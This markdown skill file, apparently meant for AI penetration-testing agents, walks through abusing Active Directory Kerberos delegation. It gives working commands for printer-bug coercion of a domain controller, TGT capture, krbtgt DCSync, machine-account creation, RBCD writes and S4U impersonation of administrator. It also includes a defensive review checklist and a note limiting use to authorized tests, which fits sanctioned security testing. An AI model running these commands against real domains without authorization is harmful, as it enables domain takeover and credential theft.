---
name: attacking-kerberos-delegation
description: Identify and abuse Active Directory Kerberos delegation — unconstrained delegation with printer-bug coercion, constrained delegation with protocol transition (S4U2Self/S4U2Proxy), and resource-based constrained delegation via machine-account creation and msDS-AllowedToActOnBehalfOfOtherIdentity. Use when BloodHound or enumeration flags delegation, when you control an account with an SPN or GenericWrite over a computer, or when escalating within a domain.
---

# Attacking Kerberos Delegation

Delegation lets a service impersonate users to other services. Every form of it
is a controlled way to become someone else, and each has a misconfiguration
that removes the control. RBCD in particular turns a common, low-looking
permission — write access to a computer object — into full compromise of that
host, which is why it is the delegation attack that comes up most.

Only against domains you are authorized to test.

## When to Use

- BloodHound flags `Unconstrained`, `Constrained`, or `RBCD` delegation
- You control an account with an SPN, or `GenericWrite`/`GenericAll` over a
  computer object
- You can create machine accounts (default `MachineAccountQuota` is 10)
- You control a host configured for delegation
- Reviewing delegation configuration defensively

## When NOT to Use

- **Certificate Services abuse** — use `abusing-adcs`
- **Kerberoasting, DCSync, general AD** — use `attacking-active-directory`
- **Entra ID** — use `attacking-entra-id`
- **Detection** — use `engineering-detections`; TGS/S4U patterns and machine
  account creation (4741) are the telemetry

## Enumerate the Three Types

```bash
# Constrained + unconstrained in one pass
findDelegation.py domain.local/user:pass -dc-ip 10.0.0.10        # impacket
# PowerView
Get-DomainComputer -Unconstrained | select name
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
Get-DomainUser -TrustedToAuth
# RBCD is a per-object attribute; BloodHound's edges are the practical way to find it
```

Which type you are looking at decides everything:

| Type | Marker | Direction of trust |
| --- | --- | --- |
| Unconstrained | `TRUSTED_FOR_DELEGATION` on the account | Host can impersonate *anyone* who authenticates to it |
| Constrained | `msDS-AllowedToDelegateTo` populated | Host can impersonate anyone, but only *to listed services* |
| RBCD | `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target | *Target* names who may impersonate to it |

## Unconstrained Delegation

A host with unconstrained delegation caches the TGT of anyone who
authenticates to it. Compromise the host, then coerce a high-value account —
ideally a domain controller — to authenticate, and capture its TGT.

```bash
# On the compromised unconstrained host, monitor for incoming TGTs
Rubeus.exe monitor /interval:5 /nowrap
# Coerce a DC to authenticate to you
printerbug.py 'domain/user:pass@dc01.domain.local' attacker-host.domain.local
# or PetitPotam, or the MS-EFSR / MS-RPRN coercion of your choice

# Capture the DC's TGT, then DCSync with it
Rubeus.exe ptt /ticket:<base64 DC TGT>
mimikatz # lsadump::dcsync /user:krbtgt
```

The printer bug (MS-RPRN) and PetitPotam (MS-EFSR) exist precisely to force a
target to authenticate. Coercing a domain controller to an unconstrained host
is a direct path to domain compromise.

## Constrained Delegation

A host with constrained delegation to a service can impersonate *any* user to
that service — including a domain admin, and including yourself as a domain
admin via S4U2Self followed by S4U2Proxy.

```bash
# You control an account with msDS-AllowedToDelegateTo set to, say, cifs/dc01
getST.py -spn cifs/dc01.domain.local -impersonate administrator \
  'domain.local/svc_account:password' -dc-ip 10.0.0.10
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local
```

**The alternate-service trick matters.** S4U2Proxy returns a ticket for the
SPN you request, but the service class is not cryptographically bound — a
ticket for `cifs/dc01` can be rewritten to `host/dc01`, `ldap/dc01`, or
`http/dc01`, because the target service only checks the server name. So
delegation constrained to a "harmless" service like `time/dc01` still yields
`ldap/dc01` and therefore DCSync. Do not dismiss a constrained delegation
because the listed SPN looks benign.

## Resource-Based Constrained Delegation (RBCD)

The highest-frequency delegation attack, because the prerequisite is common:
write access to a computer object's
`msDS-AllowedToActOnBehalfOfOtherIdentity`. `GenericWrite`, `GenericAll`,
`WriteDacl`, or `WriteProperty` over the target computer is enough.

```bash
# 1. Create a machine account (default quota allows 10 per user)
addcomputer.py -computer-name 'EVIL$' -computer-pass 'Password123' \
  domain.local/user:pass -dc-ip 10.0.0.10

# 2. Write your new account into the target's RBCD attribute
rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write \
  domain.local/user:pass -dc-ip 10.0.0.10

# 3. Impersonate any user to the target via S4U
getST.py -spn cifs/target.domain.local -impersonate administrator \
  'domain.local/EVIL$:Password123' -dc-ip 10.0.0.10
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@target.domain.local
```

This is why a BloodHound `GenericWrite` edge to a computer is not a low finding.
It is a full takeover of that computer through three commands. When you report a
write primitive over a computer object, report it at RBCD severity.

**If `MachineAccountQuota` is 0**, you cannot create a machine account — but any
existing account you control that has an SPN works as the "from" identity, and
if you can set an SPN on a user account you control (via `GenericWrite` on
yourself or another user), that substitutes.

## Protected Accounts

Several targets resist impersonation regardless of the delegation path:

- Members of **Protected Users** cannot be delegated.
- Accounts flagged **"Account is sensitive and cannot be delegated"**
  (`NOT_DELEGATED`) are excluded.
- If your intended impersonation target is protected, pick a different
  privileged account that is not — there is almost always one.

Check before spending effort:

```bash
Get-DomainUser -AllowDelegation -AdminCount | select name       # delegatable admins
```

## Defensive Review

- Which accounts have unconstrained delegation, and do any need it? (A DC does;
  little else should.)
- Are privileged accounts in Protected Users and flagged `NOT_DELEGATED`?
- Is `MachineAccountQuota` reduced to 0?
- Who has write access over computer objects — especially servers and DCs?
- Is delegation to service classes on domain controllers audited?
- Are S4U2Self/S4U2Proxy patterns monitored?

## Rationalizations to Reject

- *"The delegation is only to a harmless service."* The service class is
  rewritable. `time/dc01` becomes `ldap/dc01`.
- *"It's just GenericWrite on a computer, low severity."* That is RBCD. It is a
  full host takeover.
- *"We can't create machine accounts, quota is 0."* Any SPN-bearing account you
  control substitutes.
- *"Unconstrained delegation is on a member server, not a DC."* Coerce a DC to
  authenticate to it. The server's trust level is irrelevant.
- *"The impersonation target is a domain admin, it must be protected."* Check.
  Most admins are not in Protected Users.
- *"BloodHound didn't draw the edge."* Delegation attributes need current
  collection; older data misses RBCD entirely.

<!-- attack:start -->

## ATT&CK Coverage

_Generated from `secskills-core/ttp-index.json` — edit that file, then run
`python3 scripts/sync_attack.py --write`. Re-verify IDs against the
current ATT&CK release before citing them in a report._

**Credential Access** (TA0006)

- [T1558](https://attack.mitre.org/techniques/T1558/) Steal or Forge Kerberos Tickets — see also `attacking-active-directory`

Detection content for any of these: `engineering-detections`. Proactive search: `hunting-threats`. Post-compromise: `responding-to-incidents`.

<!-- attack:end -->

## References

- `attacking-active-directory` — DCSync and the wider domain path this feeds
- `abusing-adcs` — the other high-yield escalation family; often chains with this
- `engineering-detections` — S4U and machine-account-creation telemetry
- `reporting-security-findings` — severity for write-primitive findings
- impacket (getST, rbcd, addcomputer, findDelegation), Rubeus, PowerView, BloodHound
